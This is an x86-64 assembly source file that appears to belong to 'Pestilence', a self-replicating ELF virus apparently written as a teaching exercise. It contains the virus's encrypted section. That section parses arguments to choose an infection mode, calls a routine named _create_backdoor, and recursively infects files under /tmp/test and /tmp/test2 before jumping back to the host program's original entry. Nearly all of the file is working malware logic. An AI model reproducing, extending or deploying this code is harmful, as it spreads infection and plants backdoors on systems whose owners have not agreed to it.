%define ENCRYPTED_START_S
%include "pestilence.lst"

section .text
	global _read_dir
	global _encrypted_part_start
	global _verif
	global _continue_normaly

_encrypted_part_start:
	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
	lea		rax, [rel _o_entry]
	cmp		QWORD [rax], 0
	je		_famine_start_options
	;; --------------------------------------------------------------------------------------------
	;; NOTE
	;; --------------------------------------------------------------------------------------------
	;;
	;; There are two ways CLI arguments can be passed over to the program : via registers or via 
	;; the stack.
	;; We need to check both methods (offsets) to detect if we are using one or the other.
	;; 
	;; Via stack :
	;; 		- argc : %rsp + 128
	;; 		- argv : %rsp + 136
	;; 
	;; Via registers :
	;; 		- argc : %rsp + 64
	;; 		- argv : %rsp + 72
	;; 
	;; --------------------------------------------------------------------------------------------

	;; ** If argc equals 3 **
	;; In this alternative start, we determine if we run infection only and exit right after or
	;; if we run the infection and make the program continue until its natural end.
	
	;; (To know why some times we need to execute the infection only, refer to the commentaries in fork.s
	;; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv))
	cmp		QWORD [rsp + 136], 3				; if argc == 3
	je		_stack_infect_current_dir_without_exec

	;; ** If argc equals 4 **
	cmp		QWORD [rsp + 136], 4				; if argc == 4
	je		_verify_starting_infect

;; Check if program arguments are passed via registers
_check_registers:
	cmp		QWORD [rsp + 64], 3 				; if argc == 3
	je		_reg_infect_current_dir_without_exec	; 
	
    jmp     _fork_before_exec_normaly

;; If it's a normal execution, we just infect /tmp/test(2)
_continue_normaly:
	call _create_backdoor
	mov		rax, 0
	push	rax
	push	rax

_infect_tmp_test:
; Push tmp/test on stack. _read_dir will concatene it like this: "" + "/" + "tmp/test"
	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
	push	rax								; push infection path on stack
	mov		rdi, rsp
	mov		rsi, rsp
	add		rsi, 16
	mov		rax, 1							; sets recursive infection
	push	rax
	push	rsi
	push	rdi
	call	_read_dir						; call our directory browsing function

	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
	call	_read_dir						; call our directory browsing function

;; Pop everything we just pushed
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi
	pop		rdi
	jmp _verify_o_entry


; In this alternative start, we know we have 3 arguments on the stacks, but we need to know
; if this is an infect only execution (we just run the infection, and then exit), or if we execute
; the binary after.
; To know why some times we need to execute the infection only, refer to the commentaries in fork.s
; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)

;; Start via stack
_stack_infect_current_dir_without_exec:
	mov		r10, QWORD [rsp + 152]		; argv[1]
	lea		r11, [rel _verif]			; relative address of _verif
	mov		r11, QWORD [r11]			; dereferencing
	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
	jne		_check_registers
	
	mov		rsi, QWORD [rsp + 160]		; take the argv[2]
	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
	push	rax
	push	rsi
	push	rax
	call	_read_dir

	pop rdi
	pop rdi
	pop rdi
	
	jmp _force_exit

; In this other alternative start, the arguments are received by registers. We pushed the registers to
; don't corrupt the normal execution, so we will find our arguments on the stack.

;; Start via registers
_reg_infect_current_dir_without_exec:
	mov		r10, QWORD [rsp + 72]		; here we take argv
	mov		r10, QWORD [r10 + 8]		; argv is an array, so we take the index 1 (argv[1]).
	lea		r11, [rel _verif]			; relative address of _verif
	mov		r11, QWORD [r11]			; dereferencing
	cmp		QWORD [r10], r11			; we compare the verify code, to know if it's a normal execution
	jne		_fork_before_exec_normaly
	
	mov		rsi, QWORD [rsp + 72]		; take argv
	mov		rsi, QWORD [rsi + 16]		; take argv[2]
	mov		rax, 0						; Here we said to our function: Do not infect in recursiv, only your directory
	push	rax
	push	rsi
	push	rax
	call	_read_dir
	
	pop		rdi
	pop		rdi
	pop		rdi
	
	;; Load our exit address
	lea		rax, [rel _force_exit]
	jmp _jmp_to_o_entry

%undef ENCRYPTED_START_S
